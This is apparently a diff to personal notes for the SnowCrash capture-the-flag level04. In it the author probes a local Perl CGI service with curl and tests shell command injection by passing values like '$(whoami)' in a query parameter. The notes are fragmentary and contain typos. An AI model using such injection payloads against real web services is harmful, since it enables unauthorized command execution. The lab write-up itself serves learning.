@@ -52,10 +52,23 @@ Escape character is '^]'.
 Connection closed by foreign host.
 ```
 we have connection with that
+check what is it
+
+```bash
+nginx
+```
+```bash
+apache2
+```
+we recieved information abot apache2
+
+check directories with apache2 conf
+
+find sites-enabled
 
 trying to request something via curl
 ```bash
-level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=whoami"
+level04@SnowCrash:/tmp/level04$ curl 'http://localhost:4747/?x=whoami'
 whoami
 ```
 * The web server receives it and runs the script. level04.pl like a CGI program.
@@ -71,7 +84,7 @@ whoami
 outputs whoami because in this format the request initializes the echo command.
 
 ```bash
-level04@SnowCrash:/tmp/level04$ curl "http://localhost:4747/level04.pl?x=$(whoami)"
+level04@SnowCrash:/tmp/level04$ curl 'http://localhost:4747/?x=$(whoami)'
 level04
 ```
 Here, the shell of your local terminal first sees the $(whoami) construct.
